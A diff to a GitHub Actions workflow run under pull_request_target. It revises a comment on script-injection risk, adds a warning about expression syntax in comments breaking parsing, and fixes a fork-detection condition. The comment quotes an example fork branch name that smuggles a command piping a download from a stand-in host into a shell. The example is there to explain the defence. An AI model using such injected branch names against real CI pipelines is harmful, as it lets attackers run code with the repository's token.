@@ -69,12 +69,19 @@ jobs:
           # `pull_request_target`, which means it executes in the BASE
           # repository context holding BASE repository permissions. That is
           # exactly why a fork's branch name must NEVER be interpolated into
-          # this script: `${{ }}` is expanded into the script TEXT by the
+          # this script: interpolation is expanded into the script TEXT by the
           # runner before bash ever parses it, so a fork branch named
           # `x";curl evil|sh;"` would run here with this job's token. Being in
           # the base context is what makes it dangerous, not what makes it
           # safe. Both values therefore arrive through `env:` above and are
           # only ever referenced as quoted shell variables.
+          #
+          # Do NOT write the literal two-brace expression syntax here, even
+          # inside a comment. The runner substitutes expressions into this
+          # script as TEXT before bash sees it, comments included, and an
+          # EMPTY one is a fatal workflow-parse error: it kills the whole
+          # workflow at startup with zero jobs. This gate was dead on main
+          # for exactly that reason.
           case "$PR_BRANCH" in
             ""|-*|*..*)
               echo "::error::refusing to check out an unsafe branch name"
@@ -205,7 +212,7 @@ jobs:
   # Fallback for non-fork PRs - just run basic checks
   security-check-regular-pr:
     name: Security Checks for Regular PRs
-    if: steps.fork-check.outputs.is_fork != 'true'
+    if: github.event.pull_request.head.repo.fork != true
     runs-on: ubuntu-latest
     timeout-minutes: 10
 
